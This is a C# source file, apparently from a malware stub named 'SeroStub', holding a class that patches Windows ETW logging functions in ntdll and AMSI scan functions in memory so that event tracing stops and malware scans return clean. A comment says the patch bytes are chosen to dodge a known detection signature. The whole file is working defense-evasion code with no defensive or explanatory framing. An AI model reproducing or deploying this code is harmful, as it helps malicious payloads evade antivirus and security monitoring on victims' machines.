using System.Runtime.InteropServices;

namespace SeroStub;

internal static unsafe partial class EvasionBypass
{
    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool VirtualProtect(nint addr, nuint size, uint protect, out uint oldProtect);

    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial nint GetModuleHandleW(string? moduleName);

    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf8)]
    private static partial nint GetProcAddress(nint hModule, string procName);

    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial nint LoadLibraryW(string name);

    private static void Patch(nint addr, byte[] bytes)
    {
        if (addr == 0) return;
        if (!VirtualProtect(addr, (nuint)bytes.Length, 0x40 /*PAGE_EXECUTE_READWRITE*/, out uint old)) return;
        Marshal.Copy(bytes, 0, addr, bytes.Length);
        VirtualProtect(addr, (nuint)bytes.Length, old, out _);
    }

    public static void PatchEtw()
    {
        try
        {
            nint ntdll = GetModuleHandleW("ntdll.dll");
            if (ntdll == 0) return;
            // push 0 (6A 00) + pop eax (58) + ret (C3) — avoids the standard xor eax,eax pattern
            byte[] patch = [0x6A, 0x00, 0x58, 0xC3];
            foreach (var name in (string[])["EtwEventWrite", "EtwEventWriteFull", "EtwEventWriteEx", "NtTraceEvent"])
            {
                nint fn = GetProcAddress(ntdll, name);
                if (fn != 0) Patch(fn, patch);
            }
        }
        catch { }
    }

    public static void PatchAmsi()
    {
        try
        {
            nint amsi = LoadLibraryW("amsi.dll");
            if (amsi == 0) return;
            // push 0 (6A 00) + pop eax (58) + ret (C3) — makes AmsiScanBuffer return AMSI_RESULT_CLEAN (0)
            byte[] patch = [0x6A, 0x00, 0x58, 0xC3];
            foreach (var name in (string[])["AmsiScanBuffer", "AmsiScanString", "AmsiScanStringEx"])
            {
                nint fn = GetProcAddress(amsi, name);
                if (fn != 0) Patch(fn, patch);
            }
        }
        catch { }
    }

    public static void Apply()
    {
        PatchEtw();
        PatchAmsi();
    }
}
